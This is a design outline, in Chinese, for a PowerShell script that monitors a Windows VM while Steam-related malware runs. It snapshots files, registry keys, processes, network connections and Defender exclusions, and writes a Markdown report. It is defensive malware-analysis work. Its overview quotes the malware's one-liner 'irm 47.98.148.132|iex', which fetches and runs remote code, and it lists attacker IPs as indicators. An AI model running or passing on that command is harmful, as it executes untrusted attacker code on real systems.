## SteamMalwareMonitor.ps1 — 恶意软件行为深度监控工具

### 概述
单个 PowerShell 脚本，在 Windows VM 中运行，监控 `irm 47.98.148.132|iex` 执行时的所有系统变化。控制台实时彩色输出 + 生成 Markdown 报告。

### 脚本结构

```
Phase 0: 初始化
  - 管理员权限检查
  - 创建工作目录 C:\MalwareMonitor\
  - VM 环境确认提醒

Phase 1: 事前快照
  - 文件清单：Steam 目录、C:\tmp、%TEMP%、Tencent 缓存
  - 注册表导出：Steam 键、Defender 排除项、策略键
  - 进程列表 + 网络连接 + Defender 状态

Phase 2: 实时深度监控
  - 5 个 FileSystemWatcher 覆盖关键目录
  - WMI 进程创建/销毁事件
  - WMI 注册表变更事件
  - 2秒轮询：netstat + Get-MpPreference
  - 彩色控制台实时输出 (绿=创建, 黄=修改, 红=删除, 青=注册表, 品红=进程, 蓝=网络)

Phase 3: 事后快照 + Diff
  - 再次采集 → 对比 → 生成变更清单

Phase 4: 报告生成
  - 时间线 + 变更摘要 + IOC 命中验证
  - 输出 Markdown 到 C:\MalwareMonitor\report_*.md

### 监控覆盖
| 维度 | 技术 | 目标 |
|---|---|---|
| 文件 | FileSystemWatcher | Steam\, C:\tmp\, %TEMP%, Tencent\ |
| 注册表 | WMI RegistryEvent | Defender排除项, Steam键, 策略键 |
| 进程 | WMI ProcessTrace | 全局进程创建/终止 |
| 网络 | netstat轮询 | 47.98.148.132, 64.81.113.140 等 |
| Defender | Get-MpPreference轮询 | 排除路径变化 |

### 输出
- 控制台：实时彩色事件流
- 文件：C:\MalwareMonitor\report_YYYYMMDD_HHMMSS.md
- 包含：时间线、文件变更清单、注册表变更清单、网络 IOC 验证、进程树变化